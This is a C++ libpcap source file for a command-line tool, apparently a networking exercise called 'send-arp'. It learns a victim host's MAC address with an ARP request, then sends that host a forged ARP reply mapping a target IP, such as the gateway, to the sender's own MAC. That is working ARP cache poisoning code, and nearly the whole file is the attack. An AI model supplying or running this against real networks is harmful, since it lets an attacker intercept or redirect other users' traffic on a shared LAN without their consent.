#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> \n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1 \n");
}

void arp_request(pcap_t* handle, const char* myIP, const char* myMac, const char* sender_ip) {

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(myMac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(myMac);
    packet.arp_.sip_ = htonl(Ip(myIP));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void arp_reply(pcap_t* handle, const char* myMac, const char* sender_ip, const char* sender_mac, const char* target_ip) {

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(sender_mac);
    packet.eth_.smac_ = Mac(myMac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(myMac);
    packet.arp_.sip_ = htonl(Ip(target_ip));
    packet.arp_.tmac_ = Mac(sender_mac);
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    // my mac address
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    char myMAC[18];
    char myIP[16];
    char* dev = argv[1];
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("Failed to get MAC address");
        return 1;
    }

    unsigned char* mac = (unsigned char*) ifr.ifr_hwaddr.sa_data;
    sprintf(myMAC, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    if(ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        perror("Failed to get IP address");
        return 1;
    }

    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    inet_ntop(AF_INET, &ipaddr->sin_addr, myIP, sizeof(myIP));

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    // arp request
    arp_request(handle, myIP, myMAC, argv[2]);

    // sender mac address
    struct pcap_pkthdr* header;
    const u_char* reply_packet;
    char smac_str[18];

    while (true) {
        int res = pcap_next_ex(handle, &header, &reply_packet);
        if (res == 0) continue;

        EthArpPacket* received_packet = (EthArpPacket*)reply_packet;

        if (received_packet->eth_.type_ == htons(EthHdr::Arp) && received_packet->arp_.op_ == htons(ArpHdr::Reply)) {
            unsigned char* src_mac = (unsigned char*)received_packet->arp_.smac_;
            sprintf(smac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                    src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]);
            break;
        }
    }

    // arp reply
    arp_reply(handle, myMAC, argv[2], smac_str, argv[3]);

    pcap_close(handle);
}
